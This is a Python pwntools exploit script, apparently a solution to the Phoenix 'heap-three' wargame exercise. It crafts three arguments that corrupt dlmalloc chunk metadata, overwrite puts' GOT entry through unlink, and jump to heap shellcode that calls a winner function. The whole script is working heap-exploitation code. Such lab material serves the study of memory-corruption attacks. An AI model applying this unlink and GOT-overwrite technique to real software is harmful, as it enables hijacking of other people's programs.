#!/usr/bin/env python3
from pwn import *

# https://gee.cs.oswego.edu/pub/misc/malloc-2.7.2.c

path = "/opt/phoenix/i486/heap-three"
context.binary = path
# context.log_level = "debug"

# heap start = 0xf7e69000
puts_gotplt = 0x804C13C
winner = 0x80487D5

mem1 = 0xF7E69008  # start of argv1 buffer on heap
# jmp doens't support absolute address immediates
call_winner = asm(f"mov eax, 0x{winner:x}; call eax")
# offset the shellcode away from heap metadata (fd/bk)
argv1 = b"A" * 8 + call_winner

# mem2 = 0xf7e69030
argv2 = b"A" * 32  # no need to overwrite chunk 2 metadata
argv2 += b"AAAA\x89"  # chunk 3 metadata

# mem3 = 0xf7e69058
argv3 = b"A" * 0x80  # bypass chunk 3 user data + fake data
argv3 += pack(0xFFFFFFFC) * 2  # 2 fake chunks
argv3 += pack(puts_gotplt - 12)  # fd
argv3 += pack(mem1 + 8)  # bk points to shellcode

io = process([path, argv1, argv2, argv3])
print(io.recvline())
